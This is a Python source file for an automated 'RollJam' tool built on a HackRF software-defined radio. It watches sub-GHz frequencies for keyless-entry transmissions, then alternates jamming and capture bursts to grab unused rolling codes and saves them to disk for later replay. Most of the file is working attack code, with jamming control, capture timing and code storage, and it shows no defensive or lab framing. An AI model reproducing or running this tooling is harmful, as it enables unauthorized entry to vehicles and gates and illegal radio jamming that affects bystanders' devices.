import time
import threading
import logging
import os
import numpy as np
from typing import Optional, Tuple, List
from collections import deque
from dataclasses import dataclass
import queue

logger = logging.getLogger("AutoRollJam")

# Import decoder system for diagnostic logging
try:
    from .subghz_decoder_manager import SubGhzDecoderManager
    DECODERS_AVAILABLE = True
except ImportError:
    DECODERS_AVAILABLE = False
    logger.warning("Decoder system not available for diagnostic logging")

@dataclass
class SignalDetection:
    """Validated signal detection event"""
    frequency: float
    power_dbm: float
    snr_db: float
    bandwidth_hz: float
    timestamp: float
    confidence: float  # 0.0 to 1.0

class SignalDetector:
    """
    Proper RF signal detection with statistical validation
    
    Uses power spectral density, noise floor estimation, and temporal correlation
    """
    
    # SDR calibration constants (specific to HackRF One)
    HACKRF_NOISE_FIGURE_DB = 6.0  # Typical NF
    REFERENCE_IMPEDANCE_OHM = 50.0
    ADC_BITS = 8
    ADC_FULL_SCALE_VOLTAGE = 3.3
    
    # Detection parameters
    NOISE_FLOOR_PERCENTILE = 20  # Lower percentile = lower noise floor est = higher SNR
    SNR_THRESHOLD_DB = 2.5  # Lowered from 3.5 for parity with Scanner sensitivity (3.0)
    MIN_BANDWIDTH_HZ = 500   # Allow narrower signals
    MAX_BANDWIDTH_HZ = 500e3  # Widen to 500kHz for drifting FSK/OOK
    
    def __init__(self, sample_rate: float = 2e6, fft_size: int = 2048):
        self.sample_rate = sample_rate
        self.fft_size = fft_size
        self.noise_floor_db = None
        self.history = deque(maxlen=10)  # Rolling history for temporal correlation
    
    def calculate_psd(self, samples: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:
        """
        Calculate Power Spectral Density using Welch's method
        
        Returns:
            (frequencies, psd_db) - Frequency bins and PSD in dBm/Hz
        """
        # Remove DC offset
        samples = samples - np.mean(samples)
        
        # Welch's method: segment, window, FFT, average
        num_segments = len(samples) // self.fft_size
        if num_segments < 2:
            num_segments = 1
        
        segment_length = len(samples) // num_segments
        
        psd_accumulator = np.zeros(self.fft_size)
        
        # Hann window to reduce spectral leakage
        window = np.hanning(self.fft_size)
        window_power = np.sum(window ** 2)
        
        for i in range(num_segments):
            start = i * segment_length
            end = start + self.fft_size
            
            if end > len(samples):
                break
            
            segment = samples[start:end]
            
            # Apply window
            windowed = segment * window
            
            # FFT
            spectrum = np.fft.fft(windowed, self.fft_size)
            spectrum = np.fft.fftshift(spectrum)
            
            # Power (magnitude squared)
            power = np.abs(spectrum) ** 2
            
            # Accumulate
            psd_accumulator += power
        
        # Average
        psd = psd_accumulator / num_segments
        
        # Normalize by window power and bin width
        psd = psd / (window_power * self.sample_rate / self.fft_size)
        
        # Convert to dBm/Hz (assuming 50 ohm impedance)
        # P_dBm = 10*log10(V^2 / R_ohm) + 30
        # For ADC: convert to voltage first
        adc_scale = self.ADC_FULL_SCALE_VOLTAGE / (2 ** self.ADC_BITS)
        voltage_power = psd * (adc_scale ** 2)
        power_watts = voltage_power / self.REFERENCE_IMPEDANCE_OHM
        psd_dbm = 10 * np.log10(power_watts + 1e-20) + 30  # +30 for dBm
        
        # Frequency bins
        frequencies = np.fft.fftshift(np.fft.fftfreq(self.fft_size, 1/self.sample_rate))
        
        return frequencies, psd_dbm
    
    def estimate_noise_floor(self, psd_dbm: np.ndarray) -> float:
        """
        Estimate noise floor using percentile method
        
        Returns:
            Noise floor in dBm/Hz
        """
        # Use lower percentile as noise floor (robust to signals)
        noise_floor = np.percentile(psd_dbm, self.NOISE_FLOOR_PERCENTILE)
        
        # Add noise figure
        noise_floor += self.HACKRF_NOISE_FIGURE_DB
        
        return noise_floor
    
    def detect_signal(self, samples: np.ndarray, center_freq: float) -> Optional[SignalDetection]:
        """
        Detect signal with statistical validation
        
        Args:
            samples: Complex IQ samples
            center_freq: Center frequency in Hz
        
        Returns:
            SignalDetection if valid signal found, None otherwise
        """
        if len(samples) < self.fft_size:
            return None
        
        # Calculate PSD
        frequencies, psd_dbm = self.calculate_psd(samples)
        
        # Estimate noise floor
        noise_floor = self.estimate_noise_floor(psd_dbm)
        
        # Find peak
        peak_idx = np.argmax(psd_dbm)
        peak_power = psd_dbm[peak_idx]
        peak_freq_offset = frequencies[peak_idx]
        
        # Calculate SNR
        snr_db = peak_power - noise_floor
        
        # EXTENSIVE LOGGING: Print details for anything even remotely interesting
        if snr_db > 2.0:
            peak_f = center_freq + peak_freq_offset
            print(f"[Analysis] Peak: {peak_power:.1f} dBm @ {peak_f/1e6:.3f} MHz (Offset: {peak_freq_offset/1e3:.1f} kHz) | Noise: {noise_floor:.1f} dBm | SNR: {snr_db:.1f} dB")
        
        # Check SNR threshold
        if snr_db < self.SNR_THRESHOLD_DB:
            # Debug log for "close but no cigar" signals
            if snr_db > 3.0: 
                 print(f"[Debug] REJECTED (Low SNR): {snr_db:.1f} dB < {self.SNR_THRESHOLD_DB} dB")
            return None
        
        # Estimate signal bandwidth (3 dB down from peak)
        threshold_3db = peak_power - 3.0
        above_threshold = psd_dbm > threshold_3db
        
        # Find contiguous region
        signal_bins = np.where(above_threshold)[0]
        
        if len(signal_bins) == 0:
            return None
        
        # Calculate bandwidth
        bandwidth = len(signal_bins) * (self.sample_rate / self.fft_size)
        
        # EXTENSIVE LOGGING: Bandwidth check
        if snr_db >= self.SNR_THRESHOLD_DB:
             print(f"[Analysis] Bandwidth: {bandwidth/1e3:.1f} kHz")
        
        # Validate bandwidth
        if bandwidth < self.MIN_BANDWIDTH_HZ or bandwidth > self.MAX_BANDWIDTH_HZ:
            print(f"[Debug] REJECTED (Bandwidth): {bandwidth/1e3:.1f} kHz not in {self.MIN_BANDWIDTH_HZ/1e3}-{self.MAX_BANDWIDTH_HZ/1e3} kHz")
            return None
        
        # Calculate confidence based on SNR and bandwidth
        snr_confidence = min(snr_db / 30.0, 1.0)  # 30 dB = 100% confidence
        bw_confidence = 1.0 if self.MIN_BANDWIDTH_HZ < bandwidth < 50e3 else 0.5
        confidence = (snr_confidence + bw_confidence) / 2.0
        
        # Create detection
        detection = SignalDetection(
            frequency=center_freq + peak_freq_offset,
            power_dbm=peak_power,
            snr_db=snr_db,
            bandwidth_hz=bandwidth,
            timestamp=time.time(),
            confidence=confidence
        )
        
        # Store noise floor for next iteration
        self.noise_floor_db = noise_floor
        
        # Add to history
        self.history.append(detection)
        
        return detection


class CaptureManager:
    """
    Thread-safe capture and persistence manager
    """
    
    def __init__(self, base_dir: str = "captures/subghz"):
        self.base_dir = base_dir
        self.lock = threading.Lock()
        self.capture_count = 0
        
        # Ensure directory exists
        os.makedirs(base_dir, exist_ok=True)
    
    def save_capture(self, samples: np.ndarray, frequency: float, 
                     sample_rate: float, metadata: dict = None) -> Tuple[str, str]:
        """
        Save IQ samples to CS16 file with proper formatting
        
        Args:
            samples: Complex IQ samples (numpy complex64 or complex128)
            frequency: Center frequency in Hz
            sample_rate: Sample rate in Hz
            metadata: Additional metadata dict
        
        Returns:
            (filename, filepath)
        """
        with self.lock:
            self.capture_count += 1
            timestamp = int(time.time())
            
            filename = f"rolljam_{int(frequency/1e6)}MHz_{timestamp}_{self.capture_count}.cs16"
            filepath = os.path.join(self.base_dir, filename)
            
            # Convert to CS16 format (int16 interleaved I/Q)
            # Critical: must be int16, not int8
            if samples.dtype in [np.complex64, np.complex128]:
                # Scale complex samples to int16 range
                scale = 32767 * 0.8  # 80% to prevent clipping
                i_samples = (np.real(samples) * scale).astype(np.int16)
                q_samples = (np.imag(samples) * scale).astype(np.int16)
                
                # Interleave
                iq_buf = np.empty(len(samples) * 2, dtype=np.int16)
                iq_buf[0::2] = i_samples
                iq_buf[1::2] = q_samples
            else:
                raise ValueError(f"Invalid sample dtype: {samples.dtype}, expected complex64/128")
            
            # Write file
            with open(filepath, 'wb') as f:
                f.write(iq_buf.tobytes())
            
            # Save metadata JSON
            if metadata:
                import json
                meta_path = filepath.replace('.cs16', '.json')
                with open(meta_path, 'w') as f:
                    json.dump({
                        'frequency_hz': frequency,
                        'sample_rate_hz': sample_rate,
                        'samples': len(samples),
                        'duration_sec': len(samples) / sample_rate,
                        'timestamp': timestamp,
                        'format': 'CS16',
                        **metadata
                    }, f, indent=2)
            
            return filename, filepath


class AutoRollJam:
    """
    Automated RollJam with proper RF engineering
    
    Monitors single frequency persistently, detects signals with statistical
    validation, performs time-division jamming, and captures with proper formatting.
    """
    
    # Timing constants (relaxed for process startup overhead)
    SDR_SETTLE_TIME = 100e-3  # 100 ms for PLL lock
    PRE_JAM_CAPTURE_MS = 200  # Longer pre-capture
    JAM_CAPTURE_CYCLES = 5
    CYCLE_PERIOD_MS = 200     # 200ms periodicity (allows for process startup)
    JAM_DUTY_CYCLE = 0.6      # 60% jamming, 40% capturing
    
    def __init__(self, sdr, recorder, target_freq: float = 433.92e6, frequencies: Optional[List[float]] = None, arbiter=None):
        self.sdr = sdr
        self.recorder = recorder
        self.arbiter = arbiter
        self.frequencies = frequencies or [target_freq]
        self.target_freq = target_freq if target_freq != 433.92e6 else self.frequencies[0]
        self.running = False
        self.thread = None
        
        # Components
        self.detector = SignalDetector(sample_rate=2e6)
        self.capture_mgr = CaptureManager()
        
        # Decoder system for diagnostic logging
        if DECODERS_AVAILABLE:
            self.decoder_mgr = SubGhzDecoderManager(config={})
        else:
            self.decoder_mgr = None
        
        # Event queue for async processing
        self.event_queue = queue.Queue()
        
        # State
        self.codes_captured = 0
        self.false_positives = 0
        self.samples_received = 0
        self.last_status_time = time.time()
        self.last_decoder_log_time = time.time()
    
    def start(self):
        """Start persistent monitoring on target frequency"""
        if self.running:
            logger.warning("AutoRollJam already running")
            return
        
        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=False)
        self.thread.start()
        
        logger.info(f"🚨 AutoRollJam STARTED - Target: {self.target_freq/1e6:.3f} MHz")
        print(f"\n{'='*60}")
        print("🚨 AUTOMATED ROLLJAM ACTIVE")
        print(f"{'='*60}")
        print(f"Target Frequency: {self.target_freq/1e6:.3f} MHz")
        print(f"Detection: Statistical PSD analysis")
        print(f"Mode: Time-division jam+capture")
        print("Waiting for signals...")
        print(f"{'='*60}\n")
    
    def stop(self):
        """Clean shutdown with SDR finalization"""
        logger.info("Stopping AutoRollJam...")
        self.running = False
        
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=5.0)
            
            if self.thread.is_alive():
                logger.error("Thread did not terminate cleanly")
        
        # Ensure SDR is in safe state
        try:
            self.sdr.stop_jamming()
            self.sdr.stop_rx()
        except:
            pass
        
        logger.info(f"AutoRollJam stopped. Captured: {self.codes_captured}, False positives: {self.false_positives}")
        print(f"\n✅ AutoRollJam stopped.")
        print(f"   Codes captured: {self.codes_captured}")
        print(f"   False positives: {self.false_positives}")
    
    def _monitor_loop(self):
        """
        Main monitoring loop - persistent on single frequency or hopping
        """
        # Configure SDR once (for first freq)
        self.current_freq_idx = 0
        self.last_hop_time = time.time()
        self.hop_interval = 2.5 # Hop every 2.5 seconds (Balance between UX and SDR stability)
        
        # Ensure target_freq is in list
        if self.target_freq not in self.frequencies:
            self.frequencies.insert(0, self.target_freq)
            
        if not self._configure_sdr(self.frequencies[0]):
            logger.error("SDR configuration failed")
            self.running = False
            return
        
        logger.info(f"Monitoring {self.frequencies[0]/1e6:.3f} MHz (List: {[f/1e6 for f in self.frequencies]})...")
        
        sample_queue = queue.Queue(maxsize=10)
        
        def rx_callback(samples):
            try:
                sample_queue.put_nowait(samples)
            except queue.Full:
                pass

        # Start persistent RX
        if not self.sdr.start_rx(rx_callback, requester="rolljam"):
            logger.error("Failed to start RX monitoring")
            self.running = False
            return
            
        while self.running:
            try:
                # Get samples from queue
                try:
                    samples = sample_queue.get(timeout=0.5)
                    self.samples_received += 1
                except queue.Empty:
                    # Periodic status update when no samples
                    now = time.time()
                    if now - self.last_status_time > 2.0:  # Every 2 seconds (faster updates)
                         print(f"[RollJam] Monitoring... (samples received: {self.samples_received})")
                         if self.detector.noise_floor_db is not None:
                             print(f"    - Noise Floor: {self.detector.noise_floor_db:.1f} dBm")
                         self.last_status_time = now
                    continue
                
                # Hopping Logic
                if len(self.frequencies) > 1 and (time.time() - self.last_hop_time > self.hop_interval):
                    self.last_hop_time = time.time()
                    self.current_freq_idx = (self.current_freq_idx + 1) % len(self.frequencies)
                    new_freq = self.frequencies[self.current_freq_idx]
                    self.target_freq = new_freq
                    
                    print(f"[RollJam] Hopping to {new_freq/1e6:.3f} MHz...")
                    
                    # Stop RX, Retune, Start RX
                    is_running = True
                    try:
                        # SDRController handles the complexity:
                        if not self.sdr.set_frequency(new_freq):
                             logger.error(f"Failed to tune to {new_freq}")
                        else:
                             # Wait for settle
                             time.sleep(0.1)
                    except Exception as e:
                         pass
                    
                # Detect signal
                detection = self.detector.detect_signal(samples, self.target_freq)
                
                # RF Heartbeat: Print peak analysis every 1s to help user find signal
                now = time.time()
                if now - self.last_status_time > 1.0:
                    self.last_status_time = now
                    # Quick PSD analysis for feedback
                    freqs, psd = self.detector.calculate_psd(samples)
                    peak_idx = np.argmax(psd)
                    peak_pwr = psd[peak_idx]
                    peak_freq = self.target_freq + freqs[peak_idx]
                    noise = self.detector.estimate_noise_floor(psd)
                    snr = peak_pwr - noise
                    
                    print(f"[RF Status] Noise: {noise:.1f} dBm | Peak: {peak_pwr:.1f} dBm @ {peak_freq/1e6:.3f} MHz (SNR: {snr:.1f} dB)")
                    if snr < 5.0:
                         print("    (Signal too weak or buried in noise)")
                
                # Diagnostic: Try decoder analysis on samples (periodically)
                now = time.time()
                if self.decoder_mgr and (now - self.last_decoder_log_time > 5.0):  # Every 5 seconds
                    self.last_decoder_log_time = now
                    try:
                        # Convert IQ samples to envelope
                        envelope = np.abs(samples)
                        
                        # Simple thresholding to get pulses
                        threshold = (np.max(envelope) + np.min(envelope)) / 2
                        is_high = envelope > threshold
                        
                        # Extract pulse transitions
                        transitions = np.diff(is_high.astype(int))
                        changes = np.where(np.abs(transitions) > 0)[0]
                        
                        if len(changes) > 0:
                            # Convert to pulses (level, duration_us) - similar to scanner's _burst_to_pulses
                            sample_rate = 2e6  # 2 MS/s
                            pulses = []
                            last_idx = 0
                            current_level = int(is_high[0])
                            
                            # Iterate through samples (limit to reasonable length)
                            max_samples = min(len(is_high), 5000)  # Limit processing
                            for i in range(1, max_samples):
                                if is_high[i] != current_level:
                                    duration_us = (i - last_idx) / sample_rate * 1e6
                                    if duration_us > 0:
                                        pulses.append((current_level, int(duration_us)))
                                    current_level = int(is_high[i])
                                    last_idx = i
                            
                            # Add final pulse
                            if last_idx < max_samples - 1:
                                duration_us = (max_samples - last_idx) / sample_rate * 1e6
                                if duration_us > 0:
                                    pulses.append((current_level, int(duration_us)))
                            
                            if len(pulses) > 10:  # Need minimum pulses for decoder
                                # Reset and feed decoders
                                self.decoder_mgr.reset_decoders()
                                for level, dur in pulses[:50]:  # Limit pulse count
                                    self.decoder_mgr.feed_pulse(level, dur)
                                
                                # Get decoder results
                                power = np.mean(envelope ** 2)
                                noise_floor_est = np.percentile(envelope ** 2, 25)
                                snr_est_db = 10 * np.log10(max(power / (noise_floor_est + 1e-10), 1e-9))
                                
                                decoded_results = self.decoder_mgr.get_results(current_rssi=snr_est_db)
                                
                                if decoded_results:
                                    print(f"\n[Decoder Diagnostic] Signals detected at {self.target_freq/1e6:.3f} MHz:")
                                    for res in decoded_results:
                                        replay_flag = " [REPLAY]" if getattr(res, 'is_replay', False) else ""
                                        print(f"  • Protocol: {res.protocol} | Data: {res.data} | RSSI: {res.rssi:.1f} dB{replay_flag}")
                                else:
                                    # Show basic stats even if no decode
                                    power = np.mean(np.abs(samples) ** 2)
                                    noise_floor_est = np.percentile(np.abs(samples) ** 2, 25)
                                    snr_est_db = 10 * np.log10(max(power / (noise_floor_est + 1e-10), 1e-9))
                                    print(f"[Decoder Diagnostic] {self.target_freq/1e6:.3f} MHz: SNR {snr_est_db:.1f} dB, {len(pulses)} pulses (no protocol match)")
                    except Exception as e:
                        logger.debug(f"Decoder diagnostic error: {e}")
                
                # Debug: Show SNR even when below threshold (periodically)
                if detection is None:
                    # Calculate basic SNR for debugging
                    try:
                        power = np.mean(np.abs(samples) ** 2)
                        noise_floor_est = np.percentile(np.abs(samples) ** 2, 25)
                        snr_est_db = 10 * np.log10(max(power / (noise_floor_est + 1e-10), 1e-9))
                        
                        # Print debug info every 100 samples (only if decoder diagnostic not shown)
                        if self.samples_received % 100 == 0 and (now - self.last_decoder_log_time < 4.0):
                            print(f"[RollJam] Samples: {self.samples_received}, Est SNR: {snr_est_db:.1f} dB (threshold: {self.detector.SNR_THRESHOLD_DB:.1f} dB)")
                    except:
                        pass
                
                if detection and detection.confidence > 0.6:
                    print(f"\n🎯 SIGNAL DETECTED!")
                    print(f"   Power: {detection.power_dbm:.1f} dBm")
                    print(f"   SNR: {detection.snr_db:.1f} dB")
                    print(f"   Confidence: {detection.confidence*100:.0f}%")
                    
                    # Bridge to arbiter for real-time app update
                    if self.arbiter:
                        self.arbiter.submit({
                            "decoder": "rolljam_monitor",
                            "protocol": "OOK_Pulse",
                            "confidence": float(detection.confidence),
                            "frame_id": f"rj_detect_{int(time.time()*1000)}",
                            "timestamp": time.time(),
                            "features": {
                                "rssi": float(detection.power_dbm), 
                                "snr": float(detection.snr_db), 
                                "freq": detection.frequency/1e6
                            }
                        })
                        self.arbiter.finalize(f"rj_detect_{int(time.time()*1000)}")

                    # Stop monitoring RX before starting attack (interleaved)
                    self.sdr.stop_rx(requester="rolljam")
                    
                    # Execute attack (which does its own RX/TX cycles)
                    success = self._execute_attack(detection)
                    
                    if success:
                        self.codes_captured += 1
                        # Brief cooldown
                        time.sleep(2.0)
                    else:
                        self.false_positives += 1

                    # Resume monitoring RX
                    if self.running:
                        if not self.sdr.start_rx(rx_callback, requester="rolljam"):
                            logger.error("Failed to resume RX monitoring")
                            break
                
            except Exception as e:
                logger.error(f"Monitor loop error: {e}")
                time.sleep(0.5)
        
        # Cleanup
        self.sdr.stop_rx(requester="rolljam")
    
    def _configure_sdr(self, freq=None) -> bool:
        """
        Configure SDR with verification
        
        Returns:
            True if successful
        """
        target = freq if freq else self.target_freq
        
        try:
            print(f"[Debug] Opening SDR...")
            if not self.sdr.open():
                print("[Debug] Failed to open SDR")
                return False
            
            # Set frequency (handles recovery and restarts internally)
            print(f"[Debug] Setting frequency to {target/1e6} MHz...")
            if not self.sdr.set_frequency(target):
                print("[Debug] Failed to set frequency")
                return False
            
            # Wait for PLL lock
            time.sleep(self.SDR_SETTLE_TIME)
            
            # Set sample rate
            if not self.sdr.set_sample_rate(2e6):
                return False
            
            # Set gain
            if not self.sdr.set_gain(62):  # Max gain for detection
                return False
            
            # Verify configuration by capturing test samples (relaxed for cold start)
            # 50,000 samples is 25ms at 2MHz - more reliable for flushing buffers
            print(f"[Debug] Verifying capture (50k samples)...")
            test_samples = self.sdr.capture_samples(50000, timeout=2.0)
            if test_samples is None:
                print(f"[Debug] Capture verification failed (timeout or empty)")
                return False
            
            print(f"[Debug] SDR Configured successfully")
            logger.info(f"SDR configured: {target/1e6:.3f} MHz, 2 MS/s, 40/62 dB gain")
            return True
            
        except Exception as e:
            logger.error(f"SDR configuration error: {e}")
            return False
    
    def _execute_attack(self, detection: SignalDetection) -> bool:
        """
        Execute time-division jam+capture attack
        
        Returns:
            True if code captured successfully
        """
        print(f"\n[RollJam] Starting attack...")
        
        all_samples = []
        
        try:
            # Time-division jam+capture cycles
            for cycle in range(self.JAM_CAPTURE_CYCLES):
                cycle_start = time.time()
                
                # JAM PHASE
                if not self.sdr.start_jamming(self.target_freq, requester="rolljam"):
                    logger.error("Jamming failed to start")
                    return False
                
                jam_time = (self.CYCLE_PERIOD_MS / 1000) * self.JAM_DUTY_CYCLE
                time.sleep(jam_time)
                
                self.sdr.stop_jamming(requester="rolljam")
                
                # CAPTURE PHASE
                capture_time = (self.CYCLE_PERIOD_MS / 1000) * (1 - self.JAM_DUTY_CYCLE)
                capture_samples_count = int(capture_time * 2e6)
                
                samples = self.sdr.capture_samples(capture_samples_count, requester="rolljam", timeout=capture_time + 0.01)
                
                if samples is not None and len(samples) > 0:
                    all_samples.append(samples)
                
                # Maintain cycle timing
                elapsed = time.time() - cycle_start
                if elapsed < (self.CYCLE_PERIOD_MS / 1000):
                    time.sleep((self.CYCLE_PERIOD_MS / 1000) - elapsed)
            
            # Ensure jamming stopped
            self.sdr.stop_jamming(requester="rolljam")
            
            if len(all_samples) == 0:
                logger.warning("No samples captured during attack")
                return False
            
            # Concatenate all capture windows
            combined_samples = np.concatenate(all_samples)
            
            # Validate capture has signal energy
            detection_check = self.detector.detect_signal(combined_samples, self.target_freq)
            
            if detection_check is None or detection_check.snr_db < 6.0:
                print(f"   ⚠️  Captured signal too weak (SNR < 6 dB)")
                return False
            
            # Save capture
            filename, filepath = self.capture_mgr.save_capture(
                combined_samples,
                self.target_freq,
                2e6,
                metadata={
                    'detection_snr_db': detection.snr_db,
                    'capture_snr_db': detection_check.snr_db,
                    'jam_cycles': self.JAM_CAPTURE_CYCLES
                }
            )
            
            # Save capture logic
            if self.recorder:
                # Add to database (thread-safe)
                with self.capture_mgr.lock:
                    self.recorder.db.append({
                        'id': str(int(time.time())),
                        'name': f'AutoRollJam_{self.codes_captured + 1}',
                        'filename': filename,
                        'filepath': filepath,
                        'freq_mhz': self.target_freq / 1e6,
                        'sample_rate': 2e6,
                        'duration': len(combined_samples) / 2e6,
                        'timestamp': int(time.time()),
                        'snr_db': detection_check.snr_db
                    })
                    self.recorder._save_db()

            # Final attribution to arbiter
            if self.arbiter:
                self.arbiter.submit({
                    "decoder": "rolljam_engine",
                    "protocol": "RollJam_Captured",
                    "confidence": 1.0,
                    "frame_id": f"rj_cap_{int(time.time()*1000)}",
                    "timestamp": time.time(),
                    "features": {
                        "filename": filename,
                        "snr": float(detection_check.snr_db),
                        "freq": self.target_freq/1e6
                    }
                })
                self.arbiter.finalize(f"rj_cap_{int(time.time()*1000)}")
            
            return True
            
        except Exception as e:
            logger.error(f"Attack execution error: {e}")
            import traceback
            traceback.print_exc()
            
            # Ensure jamming is stopped
            try:
                self.sdr.stop_jamming(requester="rolljam")
            except:
                pass
            
            return False
